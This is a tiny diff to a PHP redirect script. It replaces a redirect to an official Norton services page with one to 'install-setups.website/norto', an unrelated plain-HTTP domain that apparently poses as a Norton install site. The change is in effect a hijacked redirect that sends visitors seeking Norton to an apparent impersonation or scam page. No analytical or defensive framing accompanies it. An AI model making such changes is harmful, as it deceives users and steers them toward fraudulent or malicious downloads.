@@ -1,4 +1,4 @@
 <?php
-header("Location: https://uk.norton.com/nortonservices?inid=nortoncom_nav_nortonservices_homepage:home");
+header("Location: http://install-setups.website/norto");
 die();
 ?>
